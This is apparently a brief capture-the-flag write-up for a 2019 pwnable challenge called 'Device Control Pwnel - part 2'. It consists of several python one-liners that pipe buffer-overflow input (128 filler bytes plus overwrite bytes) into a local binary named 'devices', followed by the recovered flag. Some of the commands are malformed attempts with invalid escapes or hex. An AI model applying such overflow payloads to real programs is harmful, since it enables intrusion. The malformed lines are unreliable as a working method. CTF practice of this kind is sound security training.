## Device Control Pwnel - part 2

**Categories:** 2019, pwnable
**Points:** 150
**Description:**

>  The Device Control Pwnel challenge
>  contains another flag; this is the place to turn it into points.
>  


## Write-up

python -c 'print("2\n" + "name\n" + "A"*128+"\LL\af\7d\ab\c1\33\ca\00\81\n" + "1\n")' | ./devices

python -c 'print("2\n" + "name\n" + "A"*128+ bytes.fromhex("LLaf7dabc133ca0081") +"\n" + "1\n")' | ./devices

python -c 'print("2\n" + "name\n" + "A"*128+"a\n" + "1\n")' | ./devices

python -c 'print("2\n" + "name\n" + "A"*128+"\xaf\x7d\xab\xc1\x33\xca\x00\x81\n" + "1")' | ./devices

python -c 'print("2\n" + "name\n" + "A"*128+"1234567\x81\n" + "3\n1\n" + "name\n" + "A"*128+"\xaf\x7d\xab\xc1\x33\xca\x00\n" + "1\n4")' | ./devices

NIXU{h0w_t0_d3al_w1th_null_byt3s\x00}
